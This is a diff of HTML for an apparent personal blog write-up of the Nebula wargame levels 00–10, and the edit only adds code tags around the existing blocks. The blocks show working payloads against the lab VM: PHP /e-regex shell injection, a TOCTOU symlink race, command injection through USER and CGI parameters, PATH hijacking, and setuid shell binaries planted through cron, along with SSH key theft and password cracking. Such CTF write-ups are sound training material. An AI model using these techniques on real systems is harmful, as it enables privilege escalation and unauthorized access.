@@ -45,18 +45,18 @@
 At first, I felt intimidated by <code>root:root</code> access to <code>capture.pcap</code> file. However, it occured that the file allows to be read by anyone. In that case, we might be able to copy it and retrieve necessary information.</p>
 <h4>Result</h4>
 <p>After downloading <code>capture.pcap</code> I was able to open it with <code>wireshark</code>, where I've seen some tcp traffic. By selecting <code>Follow TCP</code> I've noticed that this is dump of someone's login attempts.</p>
-<div class="highlight"><pre><span></span><span class="cp">..wwwbugs login: l.le.ev.ve.el.l8.8</span>
+<div class="highlight"><pre><span></span><code><span class="cp">..wwwbugs login: l.le.ev.ve.el.l8.8</span>
 <span class="cp">..</span>
 Password: backdoor...00Rm8.ate
 .
 <span class="cp">..</span>
 Login incorrect
 wwwbugs login:
-</pre></div>
+</code></pre></div>
 
 
 <p>However, hex dump shows some more details</p>
-<div class="highlight"><pre><span></span><span class="err">000000B9  62                                                 b</span>
+<div class="highlight"><pre><span></span><code><span class="err">000000B9  62                                                 b</span>
 <span class="err">000000BA  61                                                 a</span>
 <span class="err">000000BB  63                                                 c</span>
 <span class="err">000000BC  6b                                                 k</span>
@@ -77,18 +77,18 @@ wwwbugs login:
 <span class="err">000000CB  74                                                 t</span>
 <span class="err">000000CC  65                                                 e</span>
 <span class="err">000000CD  0d                                                 .</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>One can notice, that <code>x7f</code> equals to <code>backspace</code>. It probably means, that user pressed wrong key, and removed it.
 After decyphering it, it seems to be <code>backd00Rmate</code>.</p>
-<div class="highlight"><pre><span></span><span class="err">➜  ~ ssh flag08@nebula</span>
+<div class="highlight"><pre><span></span><code><span class="err">➜  ~ ssh flag08@nebula</span>
 <span class="err">flag08@nebula:~$ ls</span>
 <span class="err">capture.pcap</span>
 <span class="err">flag08@nebula:~$ getflag</span>
 <span class="err">You have successfully executed getflag on a target account</span>
 <span class="err">flag08@nebula:~$</span>
-</pre></div>
+</code></pre></div>
 
 
 <h2><a href="https://exploit.education/nebula/level-09/">Level 09</a></h2>
@@ -96,7 +96,7 @@ After decyphering it, it seems to be <code>backd00Rmate</code>.</p>
 <h4>Solution</h4>
 <p>We need to use both <code>$filename</code> and <code>$use_me</code> variables. First one needs to contain payload, second will contain program name.</p>
 <h4>Result</h4>
-<div class="highlight"><pre><span></span>level09@nebula:~$ cat exploit.php
+<div class="highlight"><pre><span></span><code>level09@nebula:~$ cat exploit.php
 <span class="o">[</span>email <span class="o">{</span><span class="si">${</span><span class="nv">system</span><span class="p">(sh)</span><span class="si">}</span><span class="o">}]</span>
 level09@nebula:~$ ~flag09/flag09 exploit.php .
 PHP Notice:  Use of undefined constant sh - assumed <span class="s1">&#39;sh&#39;</span> in /home/flag09/flag09.php<span class="o">(</span><span class="m">15</span><span class="o">)</span> : regexp code on line <span class="m">1</span>
@@ -105,20 +105,20 @@ flag09
 sh-4.2$ getflag
 You have successfully executed getflag on a target account
 sh-4.2$
-</pre></div>
+</code></pre></div>
 
 
 <p>Interesting that, when I replaced <code>sh</code> with <code>bash</code> it is not working:</p>
-<div class="highlight"><pre><span></span>PHP Notice:  Use of undefined constant bash - assumed <span class="s1">&#39;bash&#39;</span> in /home/flag09/flag09.php<span class="o">(</span><span class="m">15</span><span class="o">)</span> : regexp code on line <span class="m">1</span>
+<div class="highlight"><pre><span></span><code>PHP Notice:  Use of undefined constant bash - assumed <span class="s1">&#39;bash&#39;</span> in /home/flag09/flag09.php<span class="o">(</span><span class="m">15</span><span class="o">)</span> : regexp code on line <span class="m">1</span>
 bash-4.2$ whoami
 level09
 bash-4.2$ getflag
 getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
-</pre></div>
+</code></pre></div>
 
 
 <p>One can always provide <code>$use_me</code> variable too.</p>
-<div class="highlight"><pre><span></span>level09@nebula:~$ cat exploit.php
+<div class="highlight"><pre><span></span><code>level09@nebula:~$ cat exploit.php
 <span class="o">[</span>email <span class="o">{</span><span class="si">${</span><span class="nv">system</span><span class="p">(</span><span class="nv">$use_me</span><span class="p">)</span><span class="si">}</span><span class="o">}]</span>
 level09@nebula:~$ ~flag09/flag09 exploit.php getflag
 You have successfully executed getflag on a target account
@@ -127,7 +127,7 @@ PHP Notice:  Undefined variable: You have successfully executed getflag on a tar
 level09@nebula:~$ ~flag09/flag09 exploit.php sh
 sh-4.2$ whoami
 flag09
-</pre></div>
+</code></pre></div>
 
 
 <h2><a href="https://exploit.education/nebula/level-10/">Level 10</a></h2>
@@ -137,7 +137,7 @@ flag09
 <p>Time of Check, Time of Use means, that when program is running, it needs to verify an access to file, where we have an access. However, after doing that, we need to swap this file, with another one, which is unavailable to us.</p>
 <h4>Result</h4>
 <p>Nebula instance:</p>
-<div class="highlight"><pre><span></span>level10@nebula:~$ touch my_file
+<div class="highlight"><pre><span></span><code>level10@nebula:~$ touch my_file
 level10@nebula:~$ <span class="k">while</span> true<span class="p">;</span> <span class="k">do</span> ln -sf /home/flag10/token token<span class="p">;</span> ln -sf my_file token<span class="p">;</span> <span class="k">done</span> <span class="p">&amp;</span>
 <span class="o">[</span><span class="m">1</span><span class="o">]</span> <span class="m">4467</span>
 level10@nebula:~$ <span class="k">while</span> true<span class="p">;</span> <span class="k">do</span> /home/flag10/flag10 token debian<span class="p">;</span> <span class="k">done</span>
@@ -146,23 +146,23 @@ You don<span class="s1">&#39;t have access to token</span>
 Connecting to debian:18211 .. Connected!
 Sending file .. wrote file!
 Connecting to debian:18211 .. Unable to connect to host debian
-</pre></div>
+</code></pre></div>
 
 
 <p>Second instance</p>
-<div class="highlight"><pre><span></span>dasm@debian:~$ nc -klp <span class="m">18211</span> &gt; received
+<div class="highlight"><pre><span></span><code>dasm@debian:~$ nc -klp <span class="m">18211</span> &gt; received
 dasm@debian:~$ cat received
 .oO Oo.
 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
-</pre></div>
+</code></pre></div>
 
 
 <p>Nebula instance</p>
-<div class="highlight"><pre><span></span>level10@nebula:~$ su flag10
+<div class="highlight"><pre><span></span><code>level10@nebula:~$ su flag10
 Password:  <span class="c1"># use found token</span>
 sh-4.2$ getflag
 You have successfully executed getflag on a target account
-</pre></div>
+</code></pre></div>
                 <div class="clear"></div>
 
                 <div class="info">
@@ -187,7 +187,7 @@ You have successfully executed getflag on a target account
 <h4>Solution</h4>
 <p>Source code shows, that verification happens only for <code>token</code> name. Let's create symbolic link to file and try to read its content. After reading it, let's use it as password.</p>
 <h4>Result</h4>
-<div class="highlight"><pre><span></span>level04@nebula:/home/flag04$ ls -la
+<div class="highlight"><pre><span></span><code>level04@nebula:/home/flag04$ ls -la
 total <span class="m">13</span>
 drwxr-x--- <span class="m">2</span> flag04 level04   <span class="m">93</span> <span class="m">2011</span>-11-20 <span class="m">21</span>:52 .
 drwxr-xr-x <span class="m">1</span> root   root     <span class="m">160</span> <span class="m">2012</span>-08-27 <span class="m">07</span>:18 ..
@@ -205,14 +205,14 @@ level04@nebula:~$ su flag04
 Password:  <span class="c1"># use token here</span>
 sh-4.2$ getflag
 You have successfully executed getflag on a target account
-</pre></div>
+</code></pre></div>
 
 
 <h2><a href="https://exploit.education/nebula/level-05/">Level 05</a></h2>
 <h4>Solution</h4>
 <p>We're looking for weak permissions. It seems that <code>.backup</code> directory contains copy of ssh keys, which can be used.</p>
 <h4>Result</h4>
-<div class="highlight"><pre><span></span>level05@nebula:~$ <span class="nb">cd</span> ~flag05
+<div class="highlight"><pre><span></span><code>level05@nebula:~$ <span class="nb">cd</span> ~flag05
 level05@nebula:/home/flag05$ ls -ahtl
 total <span class="m">9</span>.0K
 drwxr-x--- <span class="m">1</span> flag05 level05   <span class="m">80</span> <span class="m">2020</span>-09-05 <span class="m">19</span>:18 .
@@ -236,14 +236,14 @@ level05@nebula:~$ tar -xvf backup-19072011.tgz
 level05@nebula:~$ ssh flag05@localhost
 flag05@nebula:~$ getflag
 You have successfully executed getflag on a target account
-</pre></div>
+</code></pre></div>
 
 
 <h2><a href="https://exploit.education/nebula/level-06/">Level 06</a></h2>
 <h4>Solution</h4>
 <p>The <code>flag06</code> came from a legacy unix system. It probably means, that password could be stored inside <code>/etc/passwd</code>. After retrieving password, I had to search for an answer, how to crack it. <code>john</code> helped with that.</p>
 <h4>Result</h4>
-<div class="highlight"><pre><span></span>level06@nebula:~$ grep flag06 /etc/passwd
+<div class="highlight"><pre><span></span><code>level06@nebula:~$ grep flag06 /etc/passwd
 flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
 ➜  ~ john --show pass
 ?:hello
@@ -253,7 +253,7 @@ level06@nebula:~$ su flag06
 Password:  <span class="c1"># use found password</span>
 sh-4.2$ getflag
 You have successfully executed getflag on a target account
-</pre></div>
+</code></pre></div>
 
 
 <h2><a href="https://exploit.education/nebula/level-07/">Level 07</a></h2>
@@ -261,7 +261,7 @@ You have successfully executed getflag on a target account
 <p>User <code>flag07</code> is running CGI server, which is pinging provided host. Host is an parameter to URL. It means, we should be able to modify URL this way, to retrieve correct information.</p>
 <h4>Result</h4>
 <p>I struggled with that for a while.</p>
-<div class="highlight"><pre><span></span>level07@nebula:/home/flag07$ wget localhost:7007/index.cgi?Host<span class="o">=</span><span class="p">;</span>getflag
+<div class="highlight"><pre><span></span><code>level07@nebula:/home/flag07$ wget localhost:7007/index.cgi?Host<span class="o">=</span><span class="p">;</span>getflag
 --2020-09-05 <span class="m">20</span>:31:46--  http://localhost:7007/index.cgi?Host<span class="o">=</span>
 Resolving localhost... <span class="m">127</span>.0.0.1
 Connecting to localhost<span class="p">|</span><span class="m">127</span>.0.0.1<span class="p">|</span>:7007... connected.
@@ -271,14 +271,14 @@ index.cgi?Host<span class="o">=</span>: Permission denied
 
 Cannot write to <span class="sb">`</span>index.cgi?Host<span class="o">=</span><span class="s1">&#39; (Permission denied).</span>
 <span class="s1">getflag is executing on a non-flag account, this doesn&#39;</span>t count
-</pre></div>
+</code></pre></div>
 
 
 <p>I wasn't sure, why it is not revealing flag. Finally, I searched through an internet for similar solution and found what's my mistake. I was using <code>;</code> instead of <code>%3b</code> which is encoded semicolon. Instead of sending my payload to website, I was sending <code>Host=localhost</code> and later, I was running separate command, under my username.</p>
 <p>Rookie error.</p>
 <h4>Alternative solution</h4>
 <p>After retrieving <code>getflag</code> I thought about another attempt to exploit a server. For this purpose, I used <code>exploit.c</code> prepared for another level, and I sent this query:</p>
-<div class="highlight"><pre><span></span>level07@nebula:/tmp$ cat &gt; exploitable.sh <span class="s">&lt;&lt; EOF</span>
+<div class="highlight"><pre><span></span><code>level07@nebula:/tmp$ cat &gt; exploitable.sh <span class="s">&lt;&lt; EOF</span>
 <span class="s">cp /tmp/exploit /home/flag07/exploit</span>
 <span class="s">chmod u+s /home/flag07/exploit</span>
 <span class="s">EOF</span>
@@ -289,7 +289,7 @@ exploit  index.cgi  thttpd.conf
 level07@nebula:/home/flag07$ ./exploit
 flag07@nebula:/home/flag07$ getflag
 You have successfully executed getflag on a target account
-</pre></div>
+</code></pre></div>
                 <div class="clear"></div>
 
                 <div class="info">
@@ -315,13 +315,13 @@ You have successfully executed getflag on a target account
 <p>Nebula VM has 20 levels. Each level can be accessed with <code>levelXX</code> username and the same password.</p>
 <h2><a href="https://exploit.education/nebula/level-00/">Level 00</a></h2>
 <h4>Solution</h4>
-<div class="highlight"><pre><span></span>find / -type f -user flag00 -perm -0400 <span class="m">2</span>&gt;/dev/null
-</pre></div>
+<div class="highlight"><pre><span></span><code>find / -type f -user flag00 -perm -0400 <span class="m">2</span>&gt;/dev/null
+</code></pre></div>
 
 
 <p>Search for all files, in all directories, belonging to <code>flag00</code> user, with <a href="https://en.wikipedia.org/wiki/Setuid">setuid</a>. Redirect all "permission error" (stderr) messages to <code>/dev/null</code> discarding those messages.</p>
 <h4>Result</h4>
-<div class="highlight"><pre><span></span>level00@nebula:~$ getflag
+<div class="highlight"><pre><span></span><code>level00@nebula:~$ getflag
 getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
 level00@nebula:~$ find / -type f -user flag00 -perm -0400 <span class="m">2</span>&gt;/dev/null
 /bin/.../flag00
@@ -333,7 +333,7 @@ Congrats, now run getflag to get your flag!
 flag00@nebula:~$
 flag00@nebula:~$ getflag
 You have successfully executed getflag on a target account
-</pre></div>
+</code></pre></div>
 
 
 <h2><a href="https://exploit.education/nebula/level-01/">Level01</a></h2>
@@ -341,7 +341,7 @@ You have successfully executed getflag on a target account
 <p>Program allows to execute arbitrary program due to <code>system</code> call for <code>echo</code>.
 Let's create fake echo with to run <code>bash</code> session with <code>flag01</code> UID.</p>
 <h4>Result</h4>
-<div class="highlight"><pre><span></span>level01@nebula:~$ getflag
+<div class="highlight"><pre><span></span><code>level01@nebula:~$ getflag
 getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
 level01@nebula:~$ cat &gt; /tmp/echo <span class="s">&lt;&lt; EOF</span>
 <span class="s">&gt; #!/usr/bin/env bash</span>
@@ -354,28 +354,28 @@ and now what?
 level01@nebula:/home/flag01$ <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> ./flag01
 flag01@nebula:/home/flag01$ getflag
 You have successfully executed getflag on a target account
-</pre></div>
+</code></pre></div>
 
 
 <h2><a href="https://exploit.education/nebula/level-02/">Level02</a></h2>
 <h4>Solution</h4>
 <p>Program is reading <code>USER</code> variable, which can be provided by attacker.</p>
 <h4>Result</h4>
-<div class="highlight"><pre><span></span>level02@nebula:~$ getflag
+<div class="highlight"><pre><span></span><code>level02@nebula:~$ getflag
 getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
 level02@nebula:~$ <span class="nv">USER</span><span class="o">=</span><span class="s2">&quot;;bash #&quot;</span> /home/flag02/flag02
 about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo ;bash # is cool&quot;</span><span class="o">)</span>
 
 flag02@nebula:~$ getflag
 You have successfully executed getflag on a target account
-</pre></div>
+</code></pre></div>
 
 
 <h2><a href="https://exploit.education/nebula/level-03/">Level03</a></h2>
 <h4>Solution</h4>
 <p>Cron is running script which is picking up content of <code>writable.d</code> directory. It is executing whatever is there. It means, that anything what is running via cron, will have the same permissions.</p>
 <h4>Result</h4>
-<div class="highlight"><pre><span></span>level03@nebula:~$ getflag
+<div class="highlight"><pre><span></span><code>level03@nebula:~$ getflag
 getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
 level03@nebula:~$ <span class="nb">cd</span> ~flag03
 level03@nebula:/home/flag03$ cat &gt; writable.d/flag <span class="s">&lt;&lt; EOF</span>
@@ -384,13 +384,13 @@ level03@nebula:/home/flag03$ cat &gt; writable.d/flag <span class="s">&lt;&lt; E
 <span class="s">&gt; EOF</span>
 level03@nebula:/home/flag03$ cat /tmp/flag.result
 You have successfully executed getflag on a target account
-</pre></div>
+</code></pre></div>
 
 
 <h4>Solution2</h4>
 <p>Prepare simple C program to gain bash access</p>
 <h4>Result2</h4>
-<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
 
@@ -404,24 +404,24 @@ You have successfully executed getflag on a target account
   <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
   <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 
-<div class="highlight"><pre><span></span>level03@nebula:/tmp$ cat &gt; /home/flag03/writable.d/exploit.sh <span class="s">&lt;&lt; EOF</span>
+<div class="highlight"><pre><span></span><code>level03@nebula:/tmp$ cat &gt; /home/flag03/writable.d/exploit.sh <span class="s">&lt;&lt; EOF</span>
 <span class="s">&gt; #!/usr/bin/env bash</span>
 <span class="s">&gt; cp /tmp/exploit /home/flag03/exploitable</span>
 <span class="s">&gt; chmod u+s /home/flag03/exploitable</span>
 <span class="s">&gt; EOF</span>
-</pre></div>
+</code></pre></div>
 
 
 <h4>Mistakes</h4>
 <h5>First</h5>
 <p>I tried to create copy of <code>exploit</code> program in <code>/tmp</code> directory. However, when I tried to run it, it didn't give me <code>flag03</code> user. After looking into <code>/etc/fstab</code> it became obvious:</p>
-<div class="highlight"><pre><span></span><span class="err">flag03@nebula:/home/flag03$ cat /etc/fstab</span>
+<div class="highlight"><pre><span></span><code><span class="err">flag03@nebula:/home/flag03$ cat /etc/fstab</span>
 <span class="err">overlayfs / overlayfs rw 0 0</span>
 <span class="err">tmpfs /tmp tmpfs nosuid,nodev 0 0</span>
-</pre></div>
+</code></pre></div>
 
 
 <p><code>tmpfs</code> has <code>nosuid</code> option. It means, that the nosuid mount option specifies that the filesystem cannot contain set userid files.</p>
